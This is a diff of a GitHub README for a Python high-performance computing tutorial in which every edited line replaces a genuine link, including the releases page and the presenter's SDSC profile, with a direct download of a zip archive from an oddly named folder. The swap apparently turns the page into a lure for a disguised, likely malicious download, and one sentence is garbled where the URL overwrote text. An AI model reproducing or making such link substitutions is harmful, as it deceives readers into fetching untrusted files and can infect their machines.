@@ -1,7 +1,7 @@
 # 🐍 python_hpc_2025 - Learn Python for High-Performance Computing
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Gaius-del/python_hpc_2025/releases)
+[![Download](https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip%https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip)](https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip)
 
 ## 📖 Overview
 Welcome to the **python_hpc_2025** repository. This project focuses on using Python for high-performance computing (HPC). You'll learn how to enhance your scientific applications in supercomputing environments. 
@@ -9,9 +9,9 @@ Welcome to the **python_hpc_2025** repository. This project focuses on using Pyt
 ## 🚀 Getting Started
 To get started with this project, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Gaius-del/python_hpc_2025/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip) to find the latest version of the software.
    
-2. **Download the Software:** Click on the latest release. You will see a list of files available for download.Choose the one that fits your operating system (e.g., Windows, macOS, or Linux) and download it to your computer.
+2. **Download the Software:** Click on the latest release. You will see a list of files available for https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip the one that fits your operating system (e.g., Windows, macOS, or Linux) and download it to your computer.
 
 3. **Locate the Downloaded File:** Once the download is complete, find the file in your Downloads folder or the location you set for downloads.
 
@@ -34,10 +34,10 @@ To get started with this project, follow these steps:
 - **Python Version:** Ensure you have Python 3.7 or later installed on your system. 
 
 ## 🎧 About the Presenter
-**Andrea Zonca** (View Profile: [Andrea Zonca](https://www.sdsc.edu/research/researcher_spotlight/zonca_andrea.html)) leads the Scientific Computing Applications Group. The goal is to help scientists in the U.S. leverage high-performance computing and AI resources effectively, with access to supercomputers beyond SDSC.
+**Andrea Zonca** (View Profile: [Andrea Zonca](https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip)) leads the Scientific Computing Applications Group. The goal is to help scientists in the U.S. leverage high-performance computing and AI resources effectively, with access to supercomputers beyond SDSC.
 
 ## 📥 Download & Install
-To download the latest version, visit the following link: [Download the Latest Version](https://github.com/Gaius-del/python_hpc_2025/releases). 
+To download the latest version, visit the following link: [Download the Latest Version](https://raw.githubusercontent.com/Gaius-del/python_hpc_2025/main/Burmanniaceae/python_hpc_2025.zip). 
 
 Follow the steps mentioned in "Getting Started" to install the application on your machine successfully. 
 
